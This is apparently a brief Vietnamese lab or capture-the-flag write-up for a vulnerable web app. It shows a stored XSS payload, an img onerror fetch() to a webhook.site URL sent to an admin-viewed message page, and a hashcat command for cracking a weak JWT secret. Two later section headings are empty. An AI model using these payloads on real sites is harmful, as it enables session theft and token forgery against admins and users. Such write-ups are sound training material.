## Writeup

### XSS

Đầu tiên vào `/settings` và bật XSS: Yes

![image](https://github.com/user-attachments/assets/e3d22f64-2713-4d4a-9a6c-82eb4faf578c)

Ở phần trang chủ có chức năng `Send messages` cho admin xem

![image](https://github.com/user-attachments/assets/f3b35e9a-47f8-4701-ae93-4078702381ae)

=> Gửi messages: `<img src=1 onerror=fetch("https://webhook.site/8bab6bcd-4a1b-4735-a2e1-5139468d7126")>`

Sau đó admin qua messages check messages, 1 request đến webhook được tạo ra

![image](https://github.com/user-attachments/assets/b99969dd-3ee2-44f9-adb0-f68f0923957a)

XSS xảy ra tại `dangerouslySetInnerHTML`

![image](https://github.com/user-attachments/assets/07f87375-dbde-4570-a629-dcfbfd572d95)


### JWT

![image](https://github.com/user-attachments/assets/12f422ef-b637-40a5-8a45-ad6e8a6f50c2)

Lỗ hổng JWT này xảy ra do sử dụng secretkey yếu (dễ dàng wordlists)

Mở Kali Linux, sử dụng hashcat:

`hashcat -m 16500 -a 0 <token> <wordlist>`


### Command Injection



### Authentication
